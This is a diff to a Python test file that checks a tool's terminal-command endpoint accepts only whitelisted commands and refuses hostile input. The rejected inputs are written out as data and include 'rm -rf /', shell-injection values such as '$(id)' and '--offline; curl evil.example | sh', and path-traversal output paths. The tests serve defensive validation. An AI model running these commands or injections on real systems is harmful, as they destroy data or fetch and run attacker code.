@@ -352,21 +352,60 @@ def test_watch_tests_accepts_only_test_runners(tmp_path):
 
 
 def test_terminal_drawer_runs_lantern_commands_only(tmp_path):
-    from lantern.server import run_terminal_command, TERMINAL_HELP
+    from lantern.server import TerminalRefused, run_terminal_command
     class Jobs:
         def start(self, pid, kind, fn):
             return {"id": "j1", "kind": kind, "status": "running"}
     class Store:
         def settings(self):
             return {"privacy": "full"}
+        def confirm_test(self, pid, cmd):
+            self.confirmed = cmd
     class App:
         jobs = Jobs(); store = Store()
     app, p, repo, out = App(), {"id": "x"}, tmp_path, tmp_path / ".lantern"
-    assert run_terminal_command(app, p, repo, out, "help")["output"] == TERMINAL_HELP
-    assert run_terminal_command(app, p, repo, out, "lantern analyze --offline")["job"]["kind"] == "analyze"
-    for bad in ("rm -rf /", "python app.py", "curl http://x", "bash", "pytest", "analyze; rm x"):
-        with pytest.raises(ValueError):
-            run_terminal_command(app, p, repo, out, bad)
-    with pytest.raises(ValueError):
-        run_terminal_command(app, p, repo, out, "accept abc --reason x")
-    assert "no open findings" in run_terminal_command(app, p, repo, out, "findings")["output"]
+    assert run_terminal_command(app, p, repo, out, ["lantern", "analyze", "--offline"])["job"]["kind"] == "analyze"
+    assert run_terminal_command(app, p, repo, out, ["trace", "--", "python", "-m", "pytest", "-q"])["job"]["kind"] == "trace"
+    assert app.store.confirmed == "python -m pytest -q"
+    assert run_terminal_command(app, p, repo, out, ["packs"])["job"]["kind"] == "packs"
+    assert run_terminal_command(app, p, repo, out, ["analyze", "--out", ".lantern"])["job"]["kind"] == "analyze"
+    bad = [["rm", "-rf", "/"], ["python", "app.py"], ["curl", "http://x"], ["bash"], ["pytest"], ["help"],
+           ["starter", "Dockerfile"], ["analyze;", "rm", "x"], ["analyze", "; rm -rf /"], ["analyze", "$(id)"],
+           ["analyze", "--offline", "&&", "curl", "x"], ["trace", "bash", "-c", "pytest"], ["trace", "python", "app.py"],
+           ["analyze", "--out", "/tmp/elsewhere"], ["analyze", "--out", "../x"], ["export", "--sarif", "../../x.sarif"],
+           ["export", "--sarif", "/etc/x"], ["verify", "--report", "../evidence.json"], ["accept", "abc", "--reason", "x"],
+           "analyze --offline", [1, 2], [], ["analyze", "--offl"]]
+    for argv in bad:
+        with pytest.raises(TerminalRefused):
+            run_terminal_command(app, p, repo, out, argv)
+
+
+def test_terminal_drawer_over_http(srv, tmp_path):
+    """POST /api/projects/<id>/cmd: one allowed command end to end, and the refusals."""
+    base, store = srv
+    repo = tmp_path / "shop"
+    shutil.copytree(FIX / "shop", repo, ignore=shutil.ignore_patterns(".lantern", "__pycache__"))
+    code, proj = call(base, "/api/projects", "POST", {"path": str(repo)})
+    pid = (proj.get("project") or proj)["id"]
+    code, r = call(base, f"/api/projects/{pid}/cmd", "POST", {"argv": ["analyze", "--offline"]})
+    assert code == 202, r
+    done = wait(base, r["job"]["id"])
+    assert done["status"] == "done" and any(l.startswith("ready") for l in done["log"])
+    assert (repo / ".lantern" / "report.html").exists()
+    code, r = call(base, f"/api/projects/{pid}/cmd", "POST", {"argv": ["export"]})
+    assert code == 202 and wait(base, r["job"]["id"])["status"] == "done"
+    assert (repo / ".lantern" / "findings.sarif").exists()
+    code, e = call(base, f"/api/projects/{pid}/cmd", "POST", {"argv": ["rm", "-rf", "/"]})
+    assert code == 400 and "not an allowed command" in e["error"] and e["allowed"][:2] == ["analyze", "trace"]
+    code, e = call(base, f"/api/projects/{pid}/cmd", "POST", {"argv": ["analyze", "--offline; curl evil.example | sh"]})
+    assert code == 400 and "unrecognized arguments" in e["error"]
+    code, e = call(base, f"/api/projects/{pid}/cmd", "POST", {"argv": ["export", "--sarif", str(tmp_path / "outside.sarif")]})
+    assert code == 400 and "inside the project" in e["error"] and not (tmp_path / "outside.sarif").exists()
+    code, e = call(base, f"/api/projects/{pid}/cmd", "POST", {"line": "analyze"})
+    assert code == 400 and "argv" in e["error"]
+    code, e = call(base, f"/api/projects/{pid}/cmd", "POST", {"argv": ["analyze"]}, token=None)
+    assert code == 403
+    code, e = call(base, f"/api/projects/{pid}/cmd", "POST", {"argv": ["analyze"]}, token="wrong")
+    assert code == 403
+    code, e = call(base, f"/api/projects/{pid}/cmd", "POST", {"argv": ["analyze"]}, host="evil.example:80")
+    assert code == 403
